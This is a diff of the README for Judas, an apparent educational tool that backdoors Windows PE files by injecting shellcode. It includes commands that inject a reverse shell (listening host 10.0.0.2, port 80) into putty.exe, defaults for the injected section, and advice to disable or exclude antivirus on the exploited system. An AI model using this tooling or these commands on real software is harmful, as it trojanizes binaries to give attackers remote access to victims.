@@ -1,4 +1,4 @@
-# PythonBackdoor
+# Judas
 
 ## Setup
 
@@ -11,6 +11,7 @@ sudo apt update && sudo apt upgrade -y
 ```
 
 After updating and upgrading the system install the dependencies needed by Judas.
+I would recommend installing keystone by building the source. I had issues using Python's Pip.
 
 ```bash
 pushd
@@ -26,7 +27,7 @@ sed -i "s/make -j8/make -j${NB_CPU}/g" ../make-share.sh
 sudo make install
 sudo ldconfig
 cd ../bindings/python
-sudo make install3 # or sudo make install for python2-bindings
+sudo make install3 
 popd
 ```
 
@@ -34,7 +35,77 @@ popd
 pip3 install -r requirements.txt
 ```
 
+## Execution
 
+To run the tool we recommend running `backdoor.py` as it is treated as the driver for Judas.
+Our tool utilizes Python's argparse module to help with command line arguments. 
+In its current state it can take in a multitiude of different arguments.
+
+## Example
+
+To inject the message box shellcode into putty.exe run the following code:
+
+`python3 ./src/backdoor ./assets/bin/putty.exe -t msg`
+
+To inject the reverse shell shellcode with listening host of 10.0.0.2 and listening port of 80 into putty.exe run the following code:
+
+`python3 ./src/backdoor ./assets/bin/putty.exe -t rev -lH 10.0.0.2 -lP 80`
+
+To run Judas on putty.exe in wizard mode run the following code:
+
+`python3 ./src/backdoor ./assets/bin/putty.exe -w`
+
+## Option Summary
+
+### Path
+
+The only required parameter is path which is expected to come immediately after the call to backdoor.
+This is the path to the file that you wish to inject.
+
+### Listening Port (-lP | --lport)
+
+Port the shellscript will listen on, not applicable to all shell scripts.
+For example the message box script does not take a listening port.
+
+### Listening Host (-lH | --lhost)
+
+Host's IP the shellscript will listen on, not applicable to all shell scripts.
+For example the message box script does not take a listening host.
+
+### Section Size (-sS | --section_size)
+
+Size of the section being injected into the binary.
+Defaults to 1024.
+
+### Page Size (-pS | --page_size)
+
+Size of the page being injected into the binary.
+Defaults to 1024.
+
+### Section Permissions (-sP | --section_permissions)
+
+Permissions of the section being injected into the binary.
+Defaults to 0xE0000000 (READ | EXECUTE).
+
+### Section Name (-sN | --section_name)
+
+Name of the section being injected into the binary.
+Defaults to .pwn.
+
+## Payload Type (-t | --type)
+
+Type of the payload being injected.
+Current options:
+    msg : message box shell script
+    rev : reverse shell script
+
+## Wizard Mode (-w | --wizard)
+
+Activates wizard which prompts users for inputs depending on type of payload chosen.
+
+## Verbose Mode (-v | --verbose)
+
+Activates verbose mode
 
 ## Windows
 
@@ -42,25 +113,23 @@ If running this script on Windows ensure you exclude this folder from Windows De
 If you do not Windows Defender will automatically delete the file produced by the script.
 Go to `Windows Defender Security Center`, then `Virus & threat protection settings`, and at the bottom there is `Exclusions`.
 Add a new folder and put in the path for this repo.
+The same goes for when you exploit the Windows system.
+In this projects current state it cannot bypass antivirus, so to see it actually work ensure AV is disabled or marked to exclude the directory Judas is executed from.
 
 ## Resources
 
-* https://www.microsoft.com/en-us/download/confirmation.aspx?id=53354
 * https://captmeelo.com/exploitdev/osceprep/2018/07/16/backdoor101-part1.html
 * https://resources.infosecinstitute.com/back-dooring-pe-files-windows/
 * https://r0ttenbeef.github.io/backdooring-pe-file/
 * https://axcheron.github.io/code-injection-with-python/
-* http://yuba.stanford.edu/~casado/pcap/section1.html
-
-## Documentation
-
 * https://docs.microsoft.com/en-us/windows/win32/debug/pe-format?redirectedfrom=MSDN
+* https://resources.infosecinstitute.com/2-malware-researchers-handbook-demystifying-pe-file/
 
-## Dependancies
+## Dependencies
 
-* Disassembler
-  * https://github.com/aquynh/capstone
 * Assembler
   * https://github.com/keystone-engine/keystone
 * PE Parser
   * https://github.com/erocarrera/pefile
+* Network Interface
+  * https://github.com/al45tair/netifaces
